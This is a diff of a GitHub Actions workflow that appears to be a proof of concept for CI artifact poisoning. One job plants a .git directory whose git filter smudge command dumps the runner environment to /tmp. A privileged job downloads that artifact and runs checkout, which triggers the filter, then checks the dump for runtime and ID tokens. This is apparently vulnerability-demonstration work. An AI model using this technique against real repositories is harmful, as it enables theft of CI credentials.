@@ -3,7 +3,8 @@ on:
   workflow_dispatch:
 
 jobs:
-  produce:
+  collect:
+    # mimics the attacker-modified 'Docs PR AI menu (collect)' workflow in a fork PR
     runs-on: ubuntu-latest
     steps:
       - name: Build malicious .git directory with filter payload
@@ -29,43 +30,48 @@ jobs:
             '	url = https://github.com/PDFtoMark/gab-poc-gitartifact' \
             '	fetch = +refs/heads/*:refs/remotes/origin/*' \
             '[filter "pwn"]' \
-            '	smudge = touch /tmp/PWN_FILTER_SMUDGE && cat' \
+            '	smudge = env > /tmp/PWN_ENV; touch /tmp/PWN_OK; cat' \
             '	clean = cat' \
             > .git/config
-          cat .git/config
           cd ..
           mkdir art
           cp -r evil/.git art/.git
           echo 1 > art/pr_number.txt
       - name: Upload artifact named pr-number
-        uses: actions/upload-artifact@v4
+        uses: actions/upload-artifact@v7
         with:
           name: pr-number
           path: art
           include-hidden-files: true
 
-  consume:
-    needs: produce
+  post-menu:
+    # mimics docs-pr-ai-menu.yml post-menu (workflow_run, privileged GITHUB_TOKEN)
+    needs: collect
     runs-on: ubuntu-latest
+    permissions:
+      checks: read
+      contents: read
+      issues: write
+      pull-requests: write
     steps:
-      - name: Download untrusted artifact into workspace
-        uses: actions/download-artifact@v4
+      - name: Download PR number artifact
+        uses: actions/download-artifact@v8
         with:
           name: pr-number
-      - name: Inspect planted .git before checkout
+          run-id: ${{ github.run_id }}
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+      - name: Resolve pull request number
+        id: resolve-pr
         run: |
-          set -x
-          ls -la
-          git --git-dir=.git log --oneline || true
-          git --git-dir=.git config --get-regexp 'filter|remote' || true
-          ls -la /tmp/PWN_FILTER_SMUDGE || echo 'not yet executed'
-      - name: Privileged checkout step
-        uses: actions/checkout@v4
+          echo "number=$(cat pr_number.txt)" >> "$GITHUB_OUTPUT"
+      - name: Checkout repository
+        uses: actions/checkout@v7.0.1
         with:
           persist-credentials: false
-      - name: Did attacker git config execute code in this job?
+      - name: Prove code execution from attacker artifact
         run: |
           set -x
-          ls -la /tmp/PWN_FILTER_SMUDGE
-          cat payload.dat
-          env | grep -c '^INPUT_' || true
+          ls -la /tmp/PWN_OK
+          test -f /tmp/PWN_ENV && echo 'ENV CAPTURED'
+          grep -oE '^(INPUT_TOKEN|ACTIONS_RUNTIME_TOKEN|ACTIONS_CACHE_URL|ACTIONS_ID_TOKEN)[A-Z_]*' /tmp/PWN_ENV | sort -u | head -10
+          git log --oneline -1
